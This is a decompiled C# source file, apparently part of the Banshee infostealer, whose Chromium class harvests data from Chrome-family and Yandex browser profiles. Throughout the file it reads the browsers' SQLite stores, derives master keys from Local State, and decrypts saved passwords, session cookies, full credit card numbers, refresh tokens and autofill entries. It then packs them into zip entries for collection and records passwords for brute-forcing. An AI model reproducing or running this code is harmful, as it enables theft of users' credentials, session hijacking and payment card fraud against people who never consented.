﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Banshee.Extensions;
using Banshee.Helper;
using Banshee.Helper.Data;
using Banshee.Helper.Encrypted;
using Banshee.Helper.Sql;

namespace Banshee.Targets.Browsers
{
	// Token: 0x0200006D RID: 109
	public class Chromium : ITarget
	{
		// Token: 0x06000141 RID: 321 RVA: 0x000098B0 File Offset: 0x000098B0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Chromium, delegate(string browser)
			{
				if (!Directory.Exists(browser))
				{
					return;
				}
				if (Chromium.IsChromiumProfile(browser))
				{
					DirectoryInfo parent = Directory.GetParent(browser);
					string text = (parent != null) ? parent.FullName : null;
					if (!string.IsNullOrEmpty(text))
					{
						this.ProfileCollect(zip, counter, text, browser);
					}
					return;
				}
				string[] source;
				try
				{
					source = Directory.GetDirectories(browser);
				}
				catch
				{
					source = Array.Empty<string>();
				}
				Parallel.ForEach<string>(source, delegate(string profile)
				{
					if (Chromium.IsChromiumProfile(profile))
					{
						this.ProfileCollect(zip, counter, browser, profile);
					}
				});
			});
		}

		// Token: 0x06000142 RID: 322 RVA: 0x000098F0 File Offset: 0x000098F0
		private static bool IsChromiumProfile(string path)
		{
			return Directory.Exists(path) && (File.Exists(Path.Combine(path, "Login Data")) || File.Exists(Path.Combine(path, "Login Data For Account")) || (File.Exists(Path.Combine(path, "Web Data")) || File.Exists(Path.Combine(path, "Ya Passman Data"))) || (File.Exists(Path.Combine(path, "Cookies")) || File.Exists(Path.Combine(path, "Ya Credit Cards"))) || File.Exists(Path.Combine(path, "Network", "Cookies")));
		}

		// Token: 0x06000143 RID: 323 RVA: 0x00009990 File Offset: 0x00009990
		private static void LogBrowserDataResult(string browsername, string profilename, string path, string table, long beforePasswords, long beforeCookies, long beforeAutoFill, long rowCount, Counter.CounterBrowser counterBrowser)
		{
			long num;
			string text;
			if (!(table == "logins"))
			{
				if (!(table == "cookies"))
				{
					if (!(table == "AutoFill"))
					{
						return;
					}
					num = counterBrowser.AutoFill - beforeAutoFill;
					text = "autofills";
				}
				else
				{
					num = counterBrowser.Cookies - beforeCookies;
					text = "cookies";
				}
			}
			else
			{
				num = counterBrowser.Password - beforePasswords;
				text = "passwords";
			}
			if (num > 0L)
			{
				DebugLogger.Log(string.Format("[{0}:{1}] Processed '{2}' table '{3}' -> collected {4} {5}", new object[]
				{
					browsername,
					profilename,
					path,
					table,
					num,
					text
				}));
				return;
			}
			if (rowCount == 0L)
			{
				DebugLogger.Log(string.Concat(new string[]
				{
					"[",
					browsername,
					":",
					profilename,
					"] Processed '",
					path,
					"' table '",
					table,
					"' -> table empty (no ",
					text,
					" rows)"
				}));
				return;
			}
			DebugLogger.Log(string.Format("[{0}:{1}] Processed '{2}' table '{3}' -> {4} rows read but no {5} collected (filtered, locked, or decrypt failed)", new object[]
			{
				browsername,
				profilename,
				path,
				table,
				rowCount,
				text
			}));
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00009AE4 File Offset: 0x00009AE4
		private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
		{
			string text = browser + "\\Local State";
			string browsername = Paths.GetBrowserName(browser);
			string profilename = Path.GetFileName(profile);
			byte[] masterv10 = LocalState.MasterKeyV10(text);
			byte[] masterv20 = LocalState.MasterKeyV20(text);
			string format = "[{0}:{1}] Using Local State at '{2}' to resolve master keys (v10: {3}, v20: {4})";
			object[] array = new object[5];
			array[0] = browsername;
			array[1] = profilename;
			array[2] = text;
			int num = 3;
			byte[] masterv = masterv10;
			array[num] = ((masterv != null) ? masterv.Length : 0);
			int num2 = 4;
			byte[] masterv2 = masterv20;
			array[num2] = ((masterv2 != null) ? masterv2.Length : 0);
			DebugLogger.Log(string.Format(format, array));
			Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
			counterBrowser.Profile = profile;
			counterBrowser.BrowserName = browsername;
			IEnumerable<object[]> source = new object[][]
			{
				new object[]
				{
					"Login Data",
					Path.Combine(profile, "Login Data"),
					new string[]
					{
						"logins"
					}
				},
				new object[]
				{
					"Login Data For Account",
					Path.Combine(profile, "Login Data For Account"),
					new string[]
					{
						"logins"
					}
				},
				new object[]
				{
					"Network Cookies",
					Path.Combine(profile, "Network", "Cookies"),
					new string[]
					{
						"cookies"
					}
				},
				new object[]
				{
					"Cookies",
					Path.Combine(profile, "Cookies"),
					new string[]
					{
						"cookies"
					}
				},
				new object[]
				{
					"Web Data",
					Path.Combine(profile, "Web Data"),
					new string[]
					{
						"AutoFill",
						"credit_cards",
						"token_service",
						"masked_credit_cards",
						"masked_ibans"
					}
				},
				new object[]
				{
					"Ya Passman Data",
					Path.Combine(profile, "Ya Passman Data"),
					new string[]
					{
						"logins"
					}
				},
				new object[]
				{
					"Ya Credit Cards",
					Path.Combine(profile, "Ya Credit Cards"),
					new string[]
					{
						"records"
					}
				}
			};
			Dictionary<string, Action<SqLite>> handlers = new Dictionary<string, Action<SqLite>>(StringComparer.OrdinalIgnoreCase)
			{
				{
					"Login Data/logins",
					delegate(SqLite sSqLite)
					{
						this.Password(zip, counter, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Login Data For Account/logins",
					delegate(SqLite sSqLite)
					{
						this.Password(zip, counter, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Cookies/cookies",
					delegate(SqLite sSqLite)
					{
						this.Cookies(zip, counter, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Network Cookies/cookies",
					delegate(SqLite sSqLite)
					{
						this.Cookies(zip, counter, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/AutoFill",
					delegate(SqLite sSqLite)
					{
						this.AutoFill(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/credit_cards",
					delegate(SqLite sSqLite)
					{
						this.CreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/token_service",
					delegate(SqLite sSqLite)
					{
						this.TokenRestore(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/masked_credit_cards",
					delegate(SqLite sSqLite)
					{
						this.MaskCreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/masked_ibans",
					delegate(SqLite sSqLite)
					{
						this.MaskedIbans(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Ya Passman Data/logins",
					delegate(SqLite sSqLite)
					{
						this.YandexPassword(zip, counter, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Ya Credit Cards/records",
					delegate(SqLite sSqLite)
					{
						this.YandexGetCard(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				}
			};
			Parallel.ForEach<object[]>(source, delegate(object[] file)
			{
				string name = (string)file[0];
				string path = (string)file[1];
				string[] array2 = (string[])file[2];
				if (!File.Exists(path))
				{
					DebugLogger.Log(string.Concat(new string[]
					{
						"[",
						browsername,
						":",
						profilename,
						"] Skipping '",
						path,
						"' for ",
						string.Join(", ", array2),
						": file not found"
					}));
					return;
				}
				DebugLogger.Log(string.Concat(new string[]
				{
					"[",
					browsername,
					":",
					profilename,
					"] Reading '",
					path,
					"' for ",
					string.Join(", ", array2)
				}));
				byte[] bytes = FileManager.ReadFile(path);
				if (bytes == null)
				{
					DebugLogger.Log(string.Concat(new string[]
					{
						"[",
						browsername,
						":",
						profilename,
						"] Failed to read '",
						path,
						"' (access denied or file locked)"
					}));
					return;
				}
				Parallel.ForEach<string>(array2, delegate(string table)
				{
					try
					{
						SqLite sqLite = new SqLite(bytes);
						sqLite.ReadTable(table);
						long rowCount = (long)sqLite.GetRowCount();
						string key = name + "/" + table;
						Action<SqLite> action;
						if (handlers.TryGetValue(key, out action))
						{
							long beforePasswords = counterBrowser.Password;
							long beforeCookies = counterBrowser.Cookies;
							long beforeAutoFill = counterBrowser.AutoFill;
							action(sqLite);
							Chromium.LogBrowserDataResult(browsername, profilename, path, table, beforePasswords, beforeCookies, beforeAutoFill, rowCount, counterBrowser);
						}
					}
					catch (Exception ex)
					{
						DebugLogger.Log(string.Concat(new string[]
						{
							"[",
							browsername,
							":",
							profilename,
							"] Failed to read table '",
							table,
							"' from '",
							path,
							"': ",
							ex.Message
						}));
					}
				});
			});
			if (counterBrowser.Cookies != 0L || counterBrowser.Password != 0L || counterBrowser.CreditCards != 0L || counterBrowser.AutoFill != 0L || counterBrowser.RestoreToken != 0L || counterBrowser.MaskCreditCard != 0L || counterBrowser.MaskedIban != 0L)
			{
				counter.Browsers.Add(counterBrowser);
			}
		}

		// Token: 0x06000145 RID: 325 RVA: 0x00009F00 File Offset: 0x00009F00
		private void Password(InMemoryZip zip, Counter counter, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			if (masterv10 == null && masterv20 == null)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 0);
					if (!BrowserDataFilter.ShouldExclude(value))
					{
						string value2 = sSqLite.GetValue(i, 3);
						byte[] blob = sSqLite.GetBlob(i, 5);
						if (blob != null && blob.Length != 0 && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2))
						{
							byte[] array = AesGcm.DecryptBrowser(blob, masterv10, masterv20, false);
							if (array != null)
							{
								string @string = Encoding.UTF8.GetString(array);
								string item = string.Concat(new string[]
								{
									"Hostname: ",
									value,
									"\nUsername: ",
									value2,
									"\nPassword: ",
									@string,
									"\n\n"
								});
								lines.Add(item);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.Password = ++counterBrowser2.Password;
								counter.AddBrutePassword(@string);
								counter.TrackPasswordDomain(value);
							}
						}
					}
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"Passwords\\Passwords_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00009FB4 File Offset: 0x00009FB4
		private void Cookies(InMemoryZip zip, Counter counter, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			if (masterv10 == null && masterv20 == null)
			{
				DebugLogger.Log(string.Concat(new string[]
				{
					"[",
					browsername,
					":",
					profilename,
					"] Skipping cookies because both v10 and v20 master keys are null."
				}));
				return;
			}
			int hostIndex = sSqLite.GetFieldIndex("host_key");
			int nameIndex = sSqLite.GetFieldIndex("name");
			int plainValueIndex = sSqLite.GetFieldIndex("value");
			int encryptedValueIndex = sSqLite.GetFieldIndex("encrypted_value");
			int pathIndex = sSqLite.GetFieldIndex("path");
			int expiresIndex = sSqLite.GetFieldIndex("expires_utc");
			int secureIndex = sSqLite.GetFieldIndex("is_secure");
			int httpOnlyIndex = sSqLite.GetFieldIndex("is_httponly");
			int topFrameSiteKeyIndex = sSqLite.GetFieldIndex("top_frame_site_key");
			if (hostIndex < 0 || nameIndex < 0 || (plainValueIndex < 0 && encryptedValueIndex < 0))
			{
				DebugLogger.Log(string.Concat(new string[]
				{
					"[",
					browsername,
					":",
					profilename,
					"] Cookies table is missing required columns (host_key/name/encrypted_value). Unable to collect cookies."
				}));
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			ConcurrentLong filteredOrSkipped = 0L;
			ConcurrentLong missingHostOrName = 0L;
			ConcurrentLong plaintextCount = 0L;
			ConcurrentLong decryptSuccess = 0L;
			ConcurrentLong decryptFailed = 0L;
			ConcurrentLong emptyEncrypted = 0L;
			ConcurrentLong decryptExceptions = 0L;
			ConcurrentBag<string> decryptFailureSamples = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, hostIndex);
					if (string.IsNullOrEmpty(value) && topFrameSiteKeyIndex >= 0)
					{
						value = sSqLite.GetValue(i, topFrameSiteKeyIndex);
					}
					if (BrowserDataFilter.ShouldExclude(value))
					{
						ConcurrentLong concurrentLong = ++filteredOrSkipped;
						filteredOrSkipped = concurrentLong;
					}
					else
					{
						string value2 = sSqLite.GetValue(i, nameIndex);
						string text = (pathIndex >= 0) ? sSqLite.GetValue(i, pathIndex) : "/";
						if (string.IsNullOrEmpty(text))
						{
							text = "/";
						}
						string text2 = (expiresIndex >= 0) ? sSqLite.GetValue(i, expiresIndex) : string.Empty;
						string a = (secureIndex >= 0) ? sSqLite.GetValue(i, secureIndex) : "0";
						if (httpOnlyIndex >= 0)
						{
							sSqLite.GetValue(i, httpOnlyIndex);
						}
						if (string.IsNullOrEmpty(value) || string.IsNullOrEmpty(value2))
						{
							ConcurrentLong concurrentLong = ++missingHostOrName;
							missingHostOrName = concurrentLong;
						}
						else
						{
							counter.TrackCookieDomain(value, text);
							string text3 = (plainValueIndex >= 0) ? sSqLite.GetValue(i, plainValueIndex) : null;
							string text4 = (!string.IsNullOrEmpty(value) && value.StartsWith(".")) ? "TRUE" : "FALSE";
							if (!string.IsNullOrEmpty(text3))
							{
								string item = string.Concat(new string[]
								{
									value,
									"\t",
									text4,
									"\t",
									text,
									"\t",
									(a == "1") ? "TRUE" : "FALSE",
									"\t",
									text2,
									"\t",
									value2,
									"\t",
									text3,
									"\n"
								});
								lines.Add(item);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.Cookies = ++counterBrowser2.Cookies;
								ConcurrentLong concurrentLong = ++plaintextCount;
								plaintextCount = concurrentLong;
							}
							else if (encryptedValueIndex < 0)
							{
								ConcurrentLong concurrentLong = ++missingHostOrName;
								missingHostOrName = concurrentLong;
							}
							else
							{
								byte[] blob = sSqLite.GetBlob(i, encryptedValueIndex);
								if (blob == null || blob.Length == 0)
								{
									DebugLogger.Log(string.Concat(new string[]
									{
										"[",
										browsername,
										":",
										profilename,
										"] Cookie '",
										value2,
										"' for host '",
										value,
										"' had empty encrypted_value."
									}));
									ConcurrentLong concurrentLong = ++emptyEncrypted;
									emptyEncrypted = concurrentLong;
								}
								else
								{
									try
									{
										string text5 = (blob.Length >= 3) ? Encoding.ASCII.GetString(blob, 0, 3) : string.Empty;
										byte[] array = AesGcm.DecryptBrowser(blob, masterv10, masterv20, true);
										if (array != null)
										{
											string @string = Encoding.UTF8.GetString(array);
											string item2 = string.Concat(new string[]
											{
												value,
												"\t",
												text4,
												"\t",
												text,
												"\t",
												(a == "1") ? "TRUE" : "FALSE",
												"\t",
												text2,
												"\t",
												value2,
												"\t",
												@string,
												"\n"
											});
											lines.Add(item2);
											Counter.CounterBrowser counterBrowser3 = counterBrowser;
											counterBrowser3.Cookies = ++counterBrowser3.Cookies;
											ConcurrentLong concurrentLong = ++decryptSuccess;
											decryptSuccess = concurrentLong;
										}
										else
										{
											ConcurrentLong concurrentLong = ++decryptFailed;
											decryptFailed = concurrentLong;
											if (decryptFailureSamples.Count < 5)
											{
												decryptFailureSamples.Add(string.Format("host={0};name={1};path={2};prefix={3};len={4}", new object[]
												{
													value,
													value2,
													text,
													text5,
													blob.Length
												}));
											}
										}
									}
									catch (Exception ex)
									{
										ConcurrentLong concurrentLong = ++decryptExceptions;
										decryptExceptions = concurrentLong;
										if (decryptFailureSamples.Count < 5)
										{
											decryptFailureSamples.Add(string.Concat(new string[]
											{
												"host=",
												value,
												";name=",
												value2,
												";error=",
												ex.Message
											}));
										}
									}
								}
							}
						}
					}
				}
				catch
				{
					ConcurrentLong concurrentLong = ++decryptExceptions;
					decryptExceptions = concurrentLong;
				}
			});
			if (decryptFailed > 0L || decryptExceptions > 0L || emptyEncrypted > 0L || missingHostOrName > 0L || filteredOrSkipped > 0L)
			{
				DebugLogger.Log(string.Format("[{0}:{1}] Cookie parse summary -> plaintext: {2}, decrypted: {3}, decrypt failed: {4}, exceptions: {5}, empty encrypted: {6}, missing host/name or encrypted_value: {7}, filtered: {8}", new object[]
				{
					browsername,
					profilename,
					plaintextCount.Value,
					decryptSuccess.Value,
					decryptFailed.Value,
					decryptExceptions.Value,
					emptyEncrypted.Value,
					missingHostOrName.Value,
					filteredOrSkipped.Value
				}));
				if (!decryptFailureSamples.IsEmpty)
				{
					DebugLogger.Log(string.Concat(new string[]
					{
						"[",
						browsername,
						":",
						profilename,
						"] Sample cookie failures: ",
						string.Join(" | ", decryptFailureSamples)
					}));
				}
			}
			zip.AddTextFile(string.Concat(new string[]
			{
				"Cookies\\Cookies_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0000A398 File Offset: 0x0000A398
		private void AutoFill(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 0);
					string value2 = sSqLite.GetValue(i, 1);
					if (!string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value))
					{
						string item = string.Concat(new string[]
						{
							"Name: ",
							value,
							"\nValue: ",
							value2,
							"\n\n"
						});
						lines.Add(item);
						Counter.CounterBrowser counterBrowser2 = counterBrowser;
						counterBrowser2.AutoFill = ++counterBrowser2.AutoFill;
					}
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"AutoFills\\AutoFill_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x06000148 RID: 328 RVA: 0x0000A420 File Offset: 0x0000A420
		private void CreditCards(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			if (masterv10 == null && masterv20 == null)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					byte[] blob = sSqLite.GetBlob(i, 4);
					string value = sSqLite.GetValue(i, 3);
					string value2 = sSqLite.GetValue(i, 2);
					string value3 = sSqLite.GetValue(i, 1);
					if (blob != null && blob.Length != 0 && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3))
					{
						byte[] array = AesGcm.DecryptBrowser(blob, masterv10, masterv20, false);
						if (array != null)
						{
							string @string = Encoding.UTF8.GetString(array);
							string item = string.Concat(new string[]
							{
								"Number: ",
								@string,
								"\nExp: ",
								value2,
								"/",
								value,
								"\nHolder: ",
								value3,
								"\n\n"
							});
							lines.Add(item);
							Counter.CounterBrowser counterBrowser2 = counterBrowser;
							counterBrowser2.CreditCards = ++counterBrowser2.CreditCards;
						}
					}
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"CreditCards\\CreditCards_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x06000149 RID: 329 RVA: 0x0000A4CC File Offset: 0x0000A4CC
		private void TokenRestore(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			if (masterv10 == null && masterv20 == null)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 0);
					byte[] blob = sSqLite.GetBlob(i, 1);
					if (blob != null && blob.Length != 0)
					{
						byte[] array = AesGcm.DecryptBrowser(blob, masterv10, masterv20, false);
						if (array != null)
						{
							string item = Encoding.UTF8.GetString(array) + ":" + value.Replace("AccountId-", "") + "\n";
							lines.Add(item);
							Counter.CounterBrowser counterBrowser2 = counterBrowser;
							counterBrowser2.RestoreToken = ++counterBrowser2.RestoreToken;
						}
					}
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"RestoreToken\\RestoreToken_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x0600014A RID: 330 RVA: 0x0000A578 File Offset: 0x0000A578
		private void YandexPassword(InMemoryZip zip, Counter counter, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			if (masterv10 == null)
			{
				return;
			}
			byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
			if (encryptionKey == null || encryptionKey.Length != 32)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 0);
					string value2 = sSqLite.GetValue(i, 2);
					string value3 = sSqLite.GetValue(i, 3);
					string value4 = sSqLite.GetValue(i, 4);
					string value5 = sSqLite.GetValue(i, 7);
					byte[] blob = sSqLite.GetBlob(i, 5);
					if (blob != null && blob.Length != 0)
					{
						byte[] bytes = YaAuthenticatedData.Decrypt(encryptionKey, blob, value, value2, value4, value3, value5);
						string @string = Encoding.UTF8.GetString(bytes);
						string item = string.Concat(new string[]
						{
							"Hostname: ",
							value,
							"\nUsername: ",
							value3,
							"\nPassword: ",
							@string,
							"\n\n"
						});
						lines.Add(item);
						Counter.CounterBrowser counterBrowser2 = counterBrowser;
						counterBrowser2.Password = ++counterBrowser2.Password;
						counter.AddBrutePassword(@string);
						counter.TrackPasswordDomain(value);
					}
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"Passwords\\Passwords_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x0600014B RID: 331 RVA: 0x0000A638 File Offset: 0x0000A638
		private void YandexGetCard(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			if (masterv10 == null)
			{
				return;
			}
			byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
			if (encryptionKey == null || encryptionKey.Length != 32)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					byte[] blob = sSqLite.GetBlob(i, 0);
					byte[] blob2 = sSqLite.GetBlob(i, 2);
					string value = sSqLite.GetValue(i, 1);
					if (blob != null && blob2 != null && blob.Length != 0 && blob2.Length != 0)
					{
						byte[] array = new byte[12];
						Array.Copy(blob2, 0, array, 0, 12);
						int num = blob2.Length - 12 - 16;
						byte[] array2 = new byte[num];
						Array.Copy(blob2, 12, array2, 0, num);
						byte[] array3 = new byte[16];
						Array.Copy(blob2, blob2.Length - 16, array3, 0, 16);
						string @string = Encoding.UTF8.GetString(AesGcm256.Decrypt(encryptionKey, array, blob, array2, array3));
						Match match = Regex.Match(@string, "[\"']?full_card_number[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
						string text = match.Success ? match.Groups["v"].Value.Trim() : null;
						if (string.IsNullOrEmpty(text))
						{
							Match match2 = Regex.Match(@string, "[\"']?(?:card_number|number)[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
							text = (match2.Success ? match2.Groups["v"].Value.Trim() : null);
						}
						Match match3 = Regex.Match(value, "[\"']?expire_date_month[\"']?\\s*:\\s*[\"']?(?<m>\\d{1,2})[\"']?", RegexOptions.IgnoreCase);
						Match match4 = Regex.Match(value, "[\"']?expire_date_year[\"']?\\s*:\\s*[\"']?(?<y>\\d{2,4})[\"']?", RegexOptions.IgnoreCase);
						string text2 = match3.Success ? match3.Groups["m"].Value.PadLeft(2, '0') : null;
						string text3 = match4.Success ? match4.Groups["y"].Value : null;
						Match match5 = Regex.Match(value, "[\"']?card_holder[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
						string text4 = match5.Success ? match5.Groups["v"].Value : null;
						if (string.IsNullOrEmpty(text4))
						{
							Match match6 = Regex.Match(value, "[\"']?(?:cardholder|holder|name)[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
							text4 = (match6.Success ? match6.Groups["v"].Value : text4);
						}
						if (!string.IsNullOrEmpty(text4))
						{
							text4 = Regex.Unescape(text4);
							text4 = Regex.Replace(text4, "\\\\u([0-9A-Fa-f]{4})", (Match m) => ((char)Convert.ToInt32(m.Groups[1].Value, 16)).ToString());
							text4 = text4.Trim();
							if (Regex.IsMatch(text4, "^[A-Za-z0-9\\+/=]{8,}$"))
							{
								try
								{
									byte[] bytes = Convert.FromBase64String(text4);
									string string2 = Encoding.UTF8.GetString(bytes);
									if (!string.IsNullOrWhiteSpace(string2))
									{
										text4 = string2.Trim();
									}
								}
								catch
								{
								}
							}
						}
						if (string.IsNullOrEmpty(text))
						{
							text = "Unknown";
						}
						if (string.IsNullOrEmpty(text2))
						{
							text2 = "Unknown";
						}
						if (string.IsNullOrEmpty(text3))
						{
							text3 = "Unknown";
						}
						if (string.IsNullOrEmpty(text4))
						{
							text4 = "Unknown";
						}
						string item = string.Concat(new string[]
						{
							"Number: ",
							text,
							"\nExp: ",
							text2,
							"/",
							text3,
							"\nHolder: ",
							text4,
							"\n\n"
						});
						lines.Add(item);
						Counter.CounterBrowser counterBrowser2 = counterBrowser;
						counterBrowser2.CreditCards = ++counterBrowser2.CreditCards;
					}
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"CreditCards\\CreditCards_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x0600014C RID: 332 RVA: 0x0000A6F0 File Offset: 0x0000A6F0
		private void MaskCreditCards(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 1);
					string value2 = sSqLite.GetValue(i, 2);
					string value3 = sSqLite.GetValue(i, 3);
					string value4 = sSqLite.GetValue(i, 4);
					string value5 = sSqLite.GetValue(i, 5);
					string value6 = sSqLite.GetValue(i, 6);
					string value7 = sSqLite.GetValue(i, 7);
					string value8 = sSqLite.GetValue(i, 12);
					string item = string.Concat(new string[]
					{
						"Name On Card: ",
						value,
						"\nNetwork: ",
						value2,
						"\nCard Last Number: ",
						value3,
						"\nExp: ",
						value4,
						"/",
						value5,
						"\nBank Name: ",
						value6,
						"\nNickName: ",
						value7,
						"\nProduct Description: ",
						value8,
						"\n\n"
					});
					lines.Add(item);
					Counter.CounterBrowser counterBrowser2 = counterBrowser;
					counterBrowser2.MaskCreditCard = ++counterBrowser2.MaskCreditCard;
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"MaskCreditCards\\MaskCreditCards_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x0600014D RID: 333 RVA: 0x0000A778 File Offset: 0x0000A778
		private void MaskedIbans(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 1);
					string value2 = sSqLite.GetValue(i, 2);
					string value3 = sSqLite.GetValue(i, 3);
					string item = string.Concat(new string[]
					{
						"Nickname: ",
						value3,
						"\nPrefix: ",
						value,
						"\nSuffix: ",
						value2,
						"\n\n"
					});
					lines.Add(item);
					Counter.CounterBrowser counterBrowser2 = counterBrowser;
					counterBrowser2.MaskedIban = ++counterBrowser2.MaskedIban;
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"MaskedIbans\\MaskedIbans[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}
	}
}
